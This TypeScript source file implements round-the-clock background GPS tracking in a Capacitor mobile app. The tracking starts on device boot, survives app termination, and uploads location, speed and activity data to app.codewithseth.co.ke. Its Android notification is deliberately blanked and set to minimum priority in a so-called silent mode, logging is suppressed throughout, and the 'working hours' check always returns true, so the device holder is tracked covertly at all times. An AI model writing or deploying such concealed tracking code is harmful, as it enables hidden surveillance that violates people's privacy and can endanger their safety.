/**
 * Native Background Location Tracking
 * Uses Capacitor Background Geolocation for true 24/7 tracking
 * Tracks even when app is closed or device reboots
 * Runs continuously in the background
 */

import { Capacitor } from '@capacitor/core';
import { authService } from './auth';

// Conditional import - only load on native platforms
let BackgroundGeolocation: any = null;

if (Capacitor.isNativePlatform()) {
  try {
    BackgroundGeolocation = require('@capacitor-community/background-geolocation').default;
  } catch (error) {
    // Plugin not available
  }
}

interface LocationPayload {
  locations: Array<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: number;
    speed: number | null;
    heading: number | null;
    altitude: number | null;
  }>;
  deviceInfo: {
    userAgent: string;
    platform: string;
    timestamp: number;
  };
  userId?: string;
}

class NativeBackgroundTracker {
  private readonly API_BASE = "https://app.codewithseth.co.ke/api";
  private isConfigured = false;
  private scheduleCheckInterval: any = null;
  private lastStoredLocation: { latitude: number; longitude: number } | null = null;
  private readonly MIN_DISTANCE_METERS = 5; // Minimum 5 meters movement to store

  constructor() {
    if (Capacitor.isNativePlatform()) {
      this.initializeBackgroundTracking();
      this.startScheduleChecker();
    }
  }

  /**
   * Calculate distance between two coordinates using Haversine formula
   * Returns distance in meters
   */
  private calculateDistance(
    lat1: number,
    lon1: number,
    lat2: number,
    lon2: number
  ): number {
    const R = 6371e3; // Earth's radius in meters
    const φ1 = (lat1 * Math.PI) / 180;
    const φ2 = (lat2 * Math.PI) / 180;
    const Δφ = ((lat2 - lat1) * Math.PI) / 180;
    const Δλ = ((lon2 - lon1) * Math.PI) / 180;

    const a =
      Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
      Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));

    return R * c; // Distance in meters
  }

  /**
   * Check if location should be stored (moved more than MIN_DISTANCE_METERS)
   */
  private shouldStoreLocation(latitude: number, longitude: number): boolean {
    if (!this.lastStoredLocation) {
      return true; // Always store first location
    }

    const distance = this.calculateDistance(
      this.lastStoredLocation.latitude,
      this.lastStoredLocation.longitude,
      latitude,
      longitude
    );

    return distance >= this.MIN_DISTANCE_METERS;
  }

  /**
   * Check if current time is within working hours (24/7 tracking enabled)
   */
  private isWithinWorkingHours(): boolean {
    // Track 24/7 - always return true
    return true;
  }

  /**
   * Start schedule checker that runs every minute
   */
  private startScheduleChecker() {
    // Check every minute if we should be tracking
    this.scheduleCheckInterval = setInterval(() => {
      this.checkAndUpdateTracking();
    }, 60000); // 60 seconds

    // Initial check
    this.checkAndUpdateTracking();
  }

  /**
   * Check time and start/stop tracking accordingly
   */
  private async checkAndUpdateTracking() {
    if (!authService.isAuthenticated()) {
      return;
    }

    const shouldTrack = this.isWithinWorkingHours();
    const isCurrentlyTracking = await this.isTracking();

    if (shouldTrack && !isCurrentlyTracking) {
      // Start tracking (within working hours)
      await this.startBackgroundTracking().catch(() => {});
    } else if (!shouldTrack && isCurrentlyTracking) {
      // Stop tracking (outside working hours)
      await this.stopBackgroundTracking().catch(() => {});
    }
  }

  /**
   * Initialize background geolocation
   * This is called automatically when the class is instantiated
   */
  private async initializeBackgroundTracking() {
    try {
      // Check if user is authenticated
      if (!authService.isAuthenticated()) {
        return; // Silent - no logging
      }

      // Only initialize if within working hours
      if (!this.isWithinWorkingHours()) {
        return; // Silent - outside working hours
      }

      await this.configureBackgroundGeolocation();
      await this.startBackgroundTracking();
      
      this.isConfigured = true;
    } catch (error) {
      // Silent - no logging
    }
  }

  /**
   * Configure background geolocation plugin
   */
  private async configureBackgroundGeolocation() {
    if (!BackgroundGeolocation) {
      return; // Plugin not available
    }

    const user = authService.getCurrentUserSync();
    const token = authService.getAccessToken();

    await BackgroundGeolocation.ready({
      // Geolocation Config
      desiredAccuracy: BackgroundGeolocation.DESIRED_ACCURACY_HIGH,
      distanceFilter: 10, // Minimum 10 meters between updates
      stopTimeout: 5, // Minutes of stationary before stopping
      
      // Activity Recognition
      stopDetectionDelay: 5, // Minutes
      disableStopDetection: false, // Enable stop detection
      
      // Application config
      debug: false, // Set to true for development
      logLevel: BackgroundGeolocation.LOG_LEVEL_OFF,
      stopOnTerminate: false, // Continue tracking when app is terminated
      startOnBoot: true, // Start automatically on device boot
      enableHeadless: true, // Enable headless mode (tracking without UI)
      
      // HTTP / SQLite config
      url: `${this.API_BASE}/location/track`,
      batchSync: true, // Batch multiple locations
      autoSync: true, // Automatically sync to server
      maxBatchSize: 50, // Max locations per batch
      autoSyncThreshold: 10, // Sync after 10 locations
      maxDaysToPersist: 7, // Keep offline data for 7 days
      maxRecordsToPersist: 10000, // Max records in local database
      
      // HTTP Headers
      headers: {
        'Content-Type': 'application/json',
        ...(token ? { 'Authorization': `Bearer ${token}` } : {})
      },
      
      // HTTP Parameters - include userId if no token
      params: {
        ...((!token && user?.id) ? { userId: user.id } : {})
      },
      
      // Geofencing (optional)
      geofenceProximityRadius: 1000, // meters
      
      // Activity Recognition (detect if user is moving, on bicycle, in vehicle, etc.)
      activityRecognitionInterval: 10000, // 10 seconds
      minimumActivityRecognitionConfidence: 75, // 75% confidence
      disableMotionActivityUpdates: false,
      
      // Android-specific - SILENT MODE (no visible notification)
      notification: {
        title: "",
        text: "",
        color: "#00aeef",
        smallIcon: "mipmap/ic_launcher",
        largeIcon: "mipmap/ic_launcher",
        priority: BackgroundGeolocation.NOTIFICATION_PRIORITY_MIN,
        channelName: "Background Service",
        sticky: false,
        // Hide notification from status bar and notification drawer
        layout: "",
        actions: []
      },
      foregroundService: true, // Required for Android 8+
      
      // Battery optimization
      locationUpdateInterval: 20000, // 20 seconds (frequent updates)
      fastestLocationUpdateInterval: 10000, // 10 seconds minimum
      deferTime: 0, // Don't defer location updates
      
      // Network
      maxRetries: 3, // Retry failed uploads 3 times
      timeout: 60, // HTTP timeout in seconds
    });

    // Listen to location updates
    BackgroundGeolocation.onLocation(this.onLocation.bind(this), this.onLocationError.bind(this));
    
    // Listen to motion changes (moving/stationary)
    BackgroundGeolocation.onMotionChange(this.onMotionChange.bind(this));
    
    // Listen to activity changes (walking/driving/etc)
    BackgroundGeolocation.onActivityChange(this.onActivityChange.bind(this));
    
    // Listen to HTTP responses
    BackgroundGeolocation.onHttp(this.onHttp.bind(this));
    
    // Listen to provider changes (GPS on/off)
    BackgroundGeolocation.onProviderChange(this.onProviderChange.bind(this));
    
    // Listen to heartbeat (periodic check even when stationary)
    BackgroundGeolocation.onHeartbeat(this.onHeartbeat.bind(this));
  }

  /**
   * Start background tracking
   */
  async startBackgroundTracking() {
    try {
      if (!BackgroundGeolocation) {
        return; // Plugin not available
      }

      // Only start if within working hours
      if (!this.isWithinWorkingHours()) {
        return; // Silent - outside working hours
      }

      const state = await BackgroundGeolocation.start();
      // Silent - no logging
    } catch (error) {
      // Silent - no logging
      throw error;
    }
  }

  /**
   * Stop background tracking
   */
  async stopBackgroundTracking() {
    try {
      if (!BackgroundGeolocation) {
        return; // Plugin not available
      }

      const state = await BackgroundGeolocation.stop();
      // Silent - no logging
    } catch (error) {
      // Silent - no logging
    }
  }

  /**
   * Handle location update
   */
  private onLocation(location: any) {
    // Filter redundant locations - only process if user moved significantly
    if (!this.shouldStoreLocation(location.coords.latitude, location.coords.longitude)) {
      // User hasn't moved more than 5 meters, skip this location
      return;
    }

    // Update last stored location
    this.lastStoredLocation = {
      latitude: location.coords.latitude,
      longitude: location.coords.longitude,
    };

    // Location is automatically sent to server by the plugin
    // Silent - no logging
  }

  /**
   * Handle location error
   */
  private onLocationError(error: number) {
    // Silent - no logging
  }

  /**
   * Handle motion change (moving <-> stationary)
   */
  private onMotionChange(event: any) {
    // Silent operation
    if (!BackgroundGeolocation) return;
    
    if (event.isMoving) {
      // User started moving - increase tracking frequency
      BackgroundGeolocation.changePace(true);
    } else {
      // User stopped - reduce tracking frequency
      BackgroundGeolocation.changePace(false);
    }
  }

  /**
   * Handle activity change (walking/driving/cycling/etc)
   */
  private onActivityChange(event: any) {
    // Silent operation
    if (!BackgroundGeolocation) return;
    
    // Adjust tracking based on activity
    if (event.activity === 'in_vehicle' && event.confidence > 75) {
      // User is driving - use vehicle navigation mode
      BackgroundGeolocation.setConfig({
        desiredAccuracy: BackgroundGeolocation.DESIRED_ACCURACY_HIGH,
        distanceFilter: 10
      });
    } else if (event.activity === 'on_foot' && event.confidence > 75) {
      // User is walking - use pedestrian mode
      BackgroundGeolocation.setConfig({
        desiredAccuracy: BackgroundGeolocation.DESIRED_ACCURACY_MEDIUM,
        distanceFilter: 5
      });
    }
  }

  /**
   * Handle HTTP response from server
   */
  private onHttp(event: any) {
    // Silent - no logging
  }

  /**
   * Handle provider change (GPS enabled/disabled)
   */
  private onProviderChange(event: any) {
    // Silent - no logging
  }

  /**
   * Handle heartbeat (fired periodically even when stationary)
   */
  private async onHeartbeat(event: any) {
    // Silent operation
    if (!BackgroundGeolocation) return;
    
    // Get current location even if user is stationary
    try {
      const location = await BackgroundGeolocation.getCurrentPosition({
        timeout: 30,
        maximumAge: 5000,
        desiredAccuracy: 10,
        samples: 1
      });
      // Silent - no logging
    } catch (error) {
      // Silent - no logging
    }
  }

  /**
   * Request background location permission
   */
  async requestPermission() {
    try {
      if (!BackgroundGeolocation) {
        return false;
      }

      const status = await BackgroundGeolocation.requestPermission();
      // Silent - no logging
      return status === BackgroundGeolocation.AUTHORIZATION_STATUS_ALWAYS;
    } catch (error) {
      // Silent - no logging
      return false;
    }
  }

  /**
   * Get current tracking state
   */
  async getState() {
    try {
      if (!BackgroundGeolocation) {
        return null;
      }

      return await BackgroundGeolocation.getState();
    } catch (error) {
      // Silent - no logging
      return null;
    }
  }

  /**
   * Check if background tracking is currently enabled
   */
  async isTracking(): Promise<boolean> {
    try {
      const state = await this.getState();
      return state?.enabled || false;
    } catch (error) {
      return false;
    }
  }

  /**
   * Get count of locations pending upload
   */
  async getPendingLocationsCount(): Promise<number> {
    try {
      if (!BackgroundGeolocation) {
        return 0;
      }

      const count = await BackgroundGeolocation.getCount();
      return count;
    } catch (error) {
      return 0;
    }
  }

  /**
   * Force sync pending locations now
   */
  async syncNow() {
    try {
      if (!BackgroundGeolocation) {
        return;
      }

      await BackgroundGeolocation.sync();
      // Silent - no logging
    } catch (error) {
      // Silent - no logging
    }
  }

  /**
   * Change tracking pace (true = moving, false = stationary)
   */
  async changePace(isMoving: boolean) {
    try {
      if (!BackgroundGeolocation) {
        return;
      }

      await BackgroundGeolocation.changePace(isMoving);
    } catch (error) {
      // Silent - no logging
    }
  }
}

// Export singleton instance (only works on native platforms)
export const nativeBackgroundTracker = Capacitor.isNativePlatform() 
  ? new NativeBackgroundTracker()
  : null;

export default NativeBackgroundTracker;
